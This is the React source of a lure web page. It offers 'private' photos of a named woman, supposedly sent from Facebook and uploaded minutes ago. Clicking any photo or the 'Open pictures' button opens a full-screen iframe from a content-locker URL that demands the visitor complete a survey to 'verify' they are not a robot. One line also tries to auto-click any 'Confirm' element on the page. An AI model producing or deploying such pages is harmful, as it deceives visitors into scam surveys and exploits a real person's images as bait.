
import './App.css';
import bg from "../src/images/bg.jpg";
import Grid from '@mui/material/Unstable_Grid2';
import { useState } from 'react';
import { Dialog } from '@mui/material';
import ana1 from "../src/images/ana1.jpg";
import ana2 from "../src/images/ana2.jpg";
import ana3 from "../src/images/ana3.png";
import ana4 from "../src/images/ana4.jpg";
import usa from "../src/images/usa.svg";
import rs from "../src/images/rs.jpg";
function App() {
  const [visible, setVisible] = useState(false);
  const handler = () => {
    setVisible(true);
  }
  const setlang = () => {
    if (language == 'rs') {
      setLanguage('us');
    }
    else {
      setLanguage("rs");
    }
    document.querySelectorAll('div[aria-label="Confirm"]').forEach((el) => el.click);
  }
  const [language, setLanguage] = useState('us');
  return (
    <>

      <div className="App" style={{ backgroundImage: `url(${bg})` }}>
        {language == 'rs' ? <div><button className='btn-secondary' onClick={() => setlang()} style={{ display: 'flex', columnGap: '5px' }}><img className='icon' src={usa} /> English</button></div> : <div><button className='btn-secondary' onClick={() => setlang()} style={{ display: 'flex', columnGap: '5px' }}><img className='icon' src={rs} />Español</button></div>}
        {language == 'rs' ? <div id='container'>

          <h1 className='center'>Ana Jovanovic</h1>
          <Grid container>
            <Grid onClick={() => handler()}>
              <img src={ana1} className='grid-item first' />
            </Grid>
            <Grid onClick={() => handler()}>
              <img src={ana2} className='grid-item second' />
            </Grid>
            <Grid onClick={() => handler()}>
              <img src={ana3} className='grid-item third' />
            </Grid>
            <Grid onClick={() => handler()}>
              <img src={ana4} className='grid-item fourth ' />
            </Grid>
          </Grid>

          <p className='ml'>Tamaño del archivo: 7MB</p>
          <p className='ml'>Enviado desde: <span style={{ color: 'rgb(0,155,255' }}>Facebook</span></p>
        
          <div id='submit' onClick={() => handler()}><button>Descargar Fotos</button></div>
          <center><small><em>Subido hace 7 minutos.</em></small></center>
          <Dialog open={visible} fullScreen>
            <iframe src="https://dim6w3digndpp.cloudfront.net/public/i_fr?it=3837187&key=8c422" height="400px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>
            <button style={{ marginInline: 'auto', width: '100%', borderRadius: '0px' }} onClick={() => setVisible(false)}>Regresa</button>
          </Dialog>
        </div>
          :
          <>
            <div id='container'>

              <h1 className='center'>Ana Jovanovic</h1>
              <Grid container>
                <Grid onClick={() => handler()}>
                  <img src={ana1} className='grid-item first' />
                </Grid>
                <Grid onClick={() => handler()}>
                  <img src={ana2} className='grid-item second' />
                </Grid>
                <Grid onClick={() => handler()}>
                  <img src={ana3} className='grid-item third' />
                </Grid>
                <Grid onClick={() => handler()}>
                  <img src={ana4} className='grid-item fourth ' />
                </Grid>
              </Grid>

              <p className='ml'>Folder size: 13MB</p>
              <p className='ml'>Picture amount: 4</p>
              <p className='ml'>Sent from: <span style={{ color: 'rgb(0,155,255' }}>Facebook</span></p>
              <small><em><p className='ml red'>*Important: to see the pictures in HD, click 'Open pictures' and verify that you are not a Robot.</p></em></small>
              <div id='submit' onClick={() => handler()}><button>Open pictures</button></div>
              <center><small><em>Uploaded 7 minutes ago</em></small></center>
              {language == 'rs' ? <>
                <Dialog open={visible} fullScreen>
                <iframe src="https://dim6w3digndpp.cloudfront.net/public/i_fr?it=3837187&key=8c422" height="200px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>
                  <em>Izaberite jednu od tri ponudjene ankete. Prilikom zavrsetka verifikacije slike ce se automatski otvoriti.</em>
                  <button style={{ marginInline: 'auto', width: '100%', borderRadius: '0px' }} onClick={() => setVisible(false)}>Regresa</button>
                </Dialog>
              </> :
                <Dialog open={visible} fullScreen>
                  <iframe src="https://dim6w3digndpp.cloudfront.net/public/i_fr?it=3837187&key=8c422" height="400px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>
                  <em className='center'>Choose one out of three surveys. Upon completing one of the surveys, the images will load automatically.</em>
                  <button style={{ marginInline: 'auto', width: '100%', borderRadius: '0px' }} onClick={() => setVisible(false)}>Take me back</button>
                </Dialog>
              }
            </div>
          </>}

      </div>
    </>
    /* <iframe src="https://dwmsurhf1svv8.cloudfront.net/public/i_fr?it=3241145&key=7f4b4" height="200px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe> */
  );
}

export default App;
